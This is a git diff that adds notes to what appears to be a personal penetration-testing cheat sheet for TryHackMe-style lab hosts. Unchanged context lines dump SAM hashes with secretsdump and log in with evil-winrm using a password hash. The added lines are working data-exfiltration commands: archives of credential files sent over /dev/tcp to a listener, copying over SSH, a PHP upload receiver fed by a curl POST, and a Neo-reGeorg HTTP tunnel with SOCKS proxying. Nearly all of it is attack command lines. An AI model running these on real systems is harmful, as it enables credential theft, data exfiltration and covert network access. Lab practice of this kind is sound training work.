@@ -895,6 +895,47 @@ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LO
 
 evil-winrm -i 10.10.110.249 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
 
+# Data Ext #
+
+nc -lvp 8080 > /tmp/task4-creds.data
+
+tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
+
+dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
+
+tar xvf task4-creds.tar
+
+# SSH Ext #
+
+tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
+
+# HTTP Ext #
+
+<?php 
+if (isset($_POST['file'])) {
+        $file = fopen("/tmp/http.bs64","w");
+        fwrite($file, $_POST['file']);
+        fclose($file);
+   }
+?>
+
+curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
+
+sudo sed -i 's/ /+/g' /tmp/http.bs64
+
+cat /tmp/http.bs64 | base64 -d | tar xvfz -
+
+# HTTP Tunnel #
+
+python3 neoreg.py generate -k thm
+
+upload tunnel.php 
+
+python3 neoreg.py -k thm -u http://10.10.127.144/uploader/files/tunnel.php
+
+curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
+
+
 
 
 
